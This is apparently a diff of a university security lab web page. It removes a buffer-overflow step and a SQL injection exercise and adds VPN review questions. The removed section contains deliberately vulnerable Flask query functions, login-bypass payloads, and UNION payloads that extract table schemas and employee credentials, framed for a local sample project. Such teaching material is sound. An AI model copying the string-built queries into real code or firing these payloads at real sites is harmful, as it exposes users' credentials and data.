-        <div class="screenshot">Take screenshots to demonstrate your results.</div>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.11</span>Use Immunity Debugger to Observe the Crash</h3>
-        <p>Install Immunity Debugger on the Windows machine.</p>
-        <p>Open and run the following file using Immunity Debugger:</p>
-        <pre><code>vulnserver.exe</code></pre>
-        <p>Then continue fuzzing the <code class="inline-code">vulnserver</code> service from Kali Linux.</p>
-        <p>Observe the Immunity Debugger interface. You should see that the <code class="inline-code">EIP</code> register contains the value:</p>
-        <pre><code>41414141</code></pre>
-        <p>This indicates a buffer overflow vulnerability.</p>
-        <div class="screenshot">Take screenshots to demonstrate your results.</div>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.12</span>Optional Task</h3>
-        <p>Exploit the buffer overflow vulnerability in <code class="inline-code">vulnserver.exe</code> by following the provided instructions.</p>
-        <div class="optional">This part is optional.</div>
-      </article>
-    </section> -->
-    <section id="question-3" class="question">
-      <h2>Question 2: SQL Injection with Python</h2>
-
-      <div class="warning-box">
-        <strong>Important:</strong> Perform this activity only on the provided local sample project. Do not test SQL injection against real websites, public services, or systems without explicit permission.
-      </div>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.1</span>Download the Sample Project</h3>
-        <p>Download the sample project to your local machine from GitHub. You may choose one of the following options.</p>
-        <p><strong>Option 1: Clone the repository using Git</strong></p>
-        <p>If Git is installed on your computer, run this command in PowerShell or a terminal:</p>
-        <pre><code>git clone https://github.com/khanhtran2711/491b3a.git</code></pre>
-        <p>Then open the project folder in Visual Studio Code.</p>
-        <p><strong>Option 2: Download the ZIP file</strong></p>
-        <p>Download the project as a ZIP file from GitHub, unzip it, and open the extracted folder in Visual Studio Code.</p>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.2</span>Install the Required Dependencies</h3>
-        <p>Open the terminal in Visual Studio Code:</p>
-        <pre><code>View → Terminal</code></pre>
-        <p>Or use the shortcut:</p>
-        <pre><code>Ctrl + `</code></pre>
-        <p>Install the <code class="inline-code">virtualenv</code> package:</p>
-        <pre><code>pip install virtualenv</code></pre>
-        <p>Create a virtual environment inside the project directory. You may replace <code class="inline-code">my_env</code> with your preferred environment name:</p>
-        <pre><code>virtualenv my_env</code></pre>
-        <p>Activate the virtual environment on Windows:</p>
-        <pre><code>.\my_env\Scripts\activate</code></pre>
-        <p>Install Flask, a lightweight Python web framework:</p>
-        <pre><code>pip install flask</code></pre>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.3</span>Insert the Vulnerable API Functions</h3>
-        <p>The attack will target two use cases: <code class="inline-code">login</code> and <code class="inline-code">search item</code>.</p>
-        <p>In <code class="inline-code">main.py</code>, insert each function after this line:</p>
-        <pre><code>#typical functions</code></pre>
-        <p>and before this line:</p>
-        <pre><code>#error handler redirection</code></pre>
-
-        <p><strong>Login handling function:</strong></p>
-        <pre><code>@app.route(&#x27;/api/v1.0/storeLoginAPI/&#x27;, methods=[&#x27;POST&#x27;])
-def loginAPI():
-    if request.method == &#x27;POST&#x27;:
-        uname, pword = (request.json[&#x27;username&#x27;], request.json[&#x27;password&#x27;])
-        g.db = connect_db()
-        cur = g.db.execute(&quot;SELECT * FROM employees WHERE username = &#x27;%s&#x27; AND password = &#x27;%s&#x27;&quot; %(uname, hash_pass(pword)))
-        if cur.fetchone():
-            result = {&#x27;status&#x27;: &#x27;success&#x27;}
-        else:
-            result = {&#x27;status&#x27;: &#x27;fail&#x27;}
-        g.db.close()
-        return jsonify(result)</code></pre>
-
-        <p><strong>Search item handling function:</strong></p>
-        <pre><code>@app.route(&#x27;/api/v1.0/storeAPI/&lt;item&gt;&#x27;, methods=[&#x27;GET&#x27;])
-def searchAPI(item):
-    g.db = connect_db()
-    curs = g.db.execute(&quot;SELECT * FROM shop_items WHERE name = &#x27;%s&#x27;&quot; %item)
-    results = [dict(name=row[0], quantity=row[1], price=row[2]) for row in curs.fetchall()]
-    g.db.close()
-    return jsonify(results)</code></pre>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.4</span>Run the Project</h3>
-        <p>Execute the project using the following command:</p>
-        <pre><code>python main.py</code></pre>
-        <p>The terminal should display output similar to a Flask development server message, including links such as:</p>
-        <pre><code>* Serving Flask app 'main'
-* Debug mode: off
-* Running on http://127.0.0.1:5000
-* Running on http://&lt;your-local-ip&gt;:5000
-Press CTRL+C to quit</code></pre>
-        <p>Click one of the displayed links to open the webpage in your browser.
-
-          <img src="homepage.png" alt="" style="max-width: 100%;">
-        </p>
-        
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.5</span>Test the Login Functionality</h3>
-        <p>Select <code class="inline-code">Login</code> on the navigation bar.</p>
-        <p>Perform a successful and legitimate login using this sample account:</p>
-        <pre><code>Username: newguy29
-Password: pass123</code></pre>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.6</span>Perform SQL Injection on the Login Form</h3>
-        <p>Test for SQL injection in the login form by entering one of the following payloads into the <code class="inline-code">username</code> field. Leave the password field empty. You may try all payloads for comparison.</p>
-        <pre><code>&#x27; or 1 = 1 or &#x27;&#x27; = &#x27;
-&#x27; or 1=1 --
-&quot; or 1=1 --
-admin&#x27; --</code></pre>
-        <div class="screenshot">Take screenshots to demonstrate your results.</div>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Discussion</span>Login Attack Analysis</h3>
-        <p>Answer the following questions:</p>
-        <ol>
-          <li>Which security objective within the CIA triad does this attack compromise?</li>
-          <li>Propose a solution to resolve this issue.</li>
-        </ol>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.7</span>Test the Search Functionality</h3>
-        <p>Select <code class="inline-code">Search</code> on the navigation bar.</p>
-        <p>Perform a legitimate search using product names such as:</p>
-        <pre><code>water
-juice
-candy</code></pre>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.8</span>Perform SQL Injection on the Search Form</h3>
-        <p>Test for SQL injection in the search form using the following payloads in top-down order:</p>
-        <pre><code># Check if it can work
-juice&#x27; UNION SELECT 1,2,3 from sqlite_master WHERE type=&quot;table&quot;; --
-
-# Get names of tables from the master table
-# sqlite_master stores schema information about tables
-juice&#x27; UNION SELECT name,sql,3 from sqlite_master WHERE type=&quot;table&quot;; --
-
-# Get information from two columns and add a third placeholder column
-juice&#x27; UNION SELECT username,password,3 from employees;--</code></pre>
-        <p>After executing all three queries above, identify the anomaly.</p>
-        <div class="screenshot">Take screenshots to demonstrate your results.</div>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Discussion</span>Search Attack Analysis</h3>
-        <p>Answer the following questions:</p>
-        <ol>
-          <li>Which security objective within the CIA triad does this attack compromise?</li>
-          <li>Propose a solution to resolve this issue.</li>
-        </ol>
-      </article>
-    </section>
-  </main>
-
-  <footer>
-    Reverse Engineering lab.
-  </footer>
+            <section id="review">
+                <h2>Review Questions</h2>
+                <ol>
+                    <li>What problem does a VPN solve?</li>
+                    <li>Does VPN traffic still use the normal network?</li>
+                    <li>What is a VPN tunnel?</li>
+                    <li>Why does WireGuard need public and private keys?</li>
+                    <li>What is the purpose of the <code>wg0</code> interface?</li>
+                    <li>What does <code>AllowedIPs</code> mean?</li>
+                    <li>Why can the VPN client open <code>http://10.10.0.1:8080</code>?</li>
+                    <li>Why can a non-VPN machine not open it?</li>
+                    <li>Why did we use <code>listen 10.10.0.1:8080;</code> instead of <code>listen 8080;</code>?</li>
+                    <li>What is the difference between website login and network-level VPN protection?</li>
+                </ol>
+                <div class="teacher">Answer these questions in MS word, then save it as a PDF file to submit it on CMS. <a href="https://cms.greenwich.edu.vn/mod/assign/view.php?id=90721">Link</a></div>
+                <div class="warning"><strong>Warning:</strong> After following the tutorial, please answer these questions in your own words, without using AI tools. Don’t worry if your answers are not completely correct; I will help you improve them.</div>
+            </section>
+            <div class="footer">Prepared as a practical classroom tutorial for teaching VPN fundamentals using Ubuntu,
+                WireGuard, and Nginx.</div>
+        </main>
+    </div>
+    <script>
+        document.querySelectorAll('.copy-btn').forEach(btn => { btn.addEventListener('click', async () => { const text = btn.parentElement.querySelector('pre').innerText; try { await navigator.clipboard.writeText(text); const old = btn.innerText; btn.innerText = 'Copied'; setTimeout(() => btn.innerText = old, 1200) } catch (e) { btn.innerText = 'Select text'; setTimeout(() => btn.innerText = 'Copy', 1200) } }) });
+    </script>
 </body>
+
 </html>
